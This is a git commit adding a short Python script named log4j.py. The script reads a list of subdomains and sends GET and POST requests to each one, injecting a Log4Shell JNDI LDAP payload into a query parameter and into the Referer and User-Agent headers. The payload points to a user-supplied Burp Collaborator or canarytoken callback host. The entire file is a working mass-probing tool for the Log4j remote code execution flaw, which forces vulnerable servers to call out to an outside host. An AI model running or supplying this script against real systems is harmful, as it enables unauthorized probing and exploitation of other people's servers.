40e83f52175c09e465b73d5dc91f23319bfe570c
SAM0-0 <91006735+SAM0-0@users.noreply.github.com>
2021-12-11 13:34:22 +0530

    PYTHON FILE

---
+++ log4j.py
@@ -0,0 +1,25 @@
+"""
+Author : SAM
+LOG4J
+"""
+
+import requests
+print("PUT YOUR SUBDOMAIN FILE IN SAME DIRECTORY")
+fil = input("ENTER YOUR SUBDOMAIN FILE (WITHOUT HTTPS://) :")
+payload = input("ENTER YOUR BURP COLLABORATOR/CANRYTOKEN URL :")
+fpayload = "${jndi:ldap://"+payload+"/a}"
+
+
+subd =  list(open(fil).read().split())
+headers={"Referer":fpayload,"User-Agent": "Mozzila"+fpayload}
+for i in range(len(subd)):
+	furl="https://"+subd[i]+"?test="+fpayload
+	#furl2="http://"+subd[i]+"?test="+fpayload
+	print(furl)
+	try:
+		requests.get(furl,headers=headers)
+		requests.post(furl,headers=headers)
+		#requests.get(furl2,headers=headers)
+		#requests.post(furl2,headers=headers)
+	except:
+		print("error")
